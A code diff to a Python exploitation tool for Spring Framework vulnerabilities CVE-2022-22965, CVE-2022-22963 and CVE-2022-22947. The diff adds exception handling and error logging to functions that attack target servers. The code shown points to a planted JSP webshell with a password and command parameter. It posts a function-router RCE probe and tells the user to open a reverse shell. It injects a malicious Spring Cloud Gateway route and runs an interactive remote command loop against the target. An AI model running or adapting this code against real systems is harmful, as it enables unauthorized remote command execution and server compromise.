@@ -54,8 +54,14 @@ def CVE_2022_22965(url, proxies):
                 cprint(result ,"green")
         else:
             cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问 [/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
     except Exception as e:
-        print(e)
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(e + '\n')
+        f2.close()
 
 def CVE_2022_22963(url, proxies):
     cprint("================开始对目标URL进行CVE-2022-22963漏洞利用================", "green")
@@ -71,19 +77,28 @@ def CVE_2022_22963(url, proxies):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     path = 'functionRouter'
-    url = url + path
-    requests.packages.urllib3.disable_warnings()
-    req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
-    code = req.status_code
-    text = req.text
-    rsp = '"error":"Internal Server Error"'
-
-    if code == 500 and rsp in text:
-        cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell', "red")
-        print('\n')
-    else:
-        cprint("[-] CVE-2022-22963漏洞不存在", "yellow")
-        print('\n')
+    
+    try:
+        url = url + path
+        requests.packages.urllib3.disable_warnings()
+        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
+        code = req.status_code
+        text = req.text
+        rsp = '"error":"Internal Server Error"'
+        if code == 500 and rsp in text:
+            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell', "red")
+            print('\n')
+        else:
+            cprint("[-] CVE-2022-22963漏洞不存在", "yellow")
+            print('\n')
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
 
 def CVE_2022_22947(url, proxies):
     cprint("================开始对目标URL进行CVE-2022-22947漏洞利用================","green")
@@ -120,33 +135,42 @@ def CVE_2022_22947(url, proxies):
               "order": 0\r
             }'''
 
-    requests.packages.urllib3.disable_warnings()
-    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
-    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-    if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
-        cprint("[+] Payload已经输出，回显结果如下：", "red")
-        print('\n')
-        print(re3.text)
-        print('\n')
-        print("[+] 执行命令模块（输入exit退出）")
-        while 1:
-            Cmd = input("[+] 请输入要执行的命令>>> ")
-            if Cmd == "exit":
-                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-                sys.exit(0)
-            else:
-                payload3 = payload2.replace('whoami', Cmd)
-                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, json=json ,verify=False, proxies=proxies)
-                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-                result = re3.text
-                cprint(result ,"green")
-                print('\n')
-    else:
-        cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
-        print('\n')
+    try:
+        requests.packages.urllib3.disable_warnings()
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
+        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
+            cprint("[+] Payload已经输出，回显结果如下：", "red")
+            print('\n')
+            print(re3.text)
+            print('\n')
+            print("[+] 执行命令模块（输入exit退出）")
+            while 1:
+                Cmd = input("[+] 请输入要执行的命令>>> ")
+                if Cmd == "exit":
+                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                    sys.exit(0)
+                else:
+                    payload3 = payload2.replace('whoami', Cmd)
+                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, json=json ,verify=False, proxies=proxies)
+                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
+                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+                    result = re3.text
+                    cprint(result ,"green")
+                    print('\n')
+        else:
+            cprint("[-] CVE-2022-22947漏洞不存在", "yellow")
+            print('\n')
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
 
 def vul(url,proxies):
     if ('://' not in url):
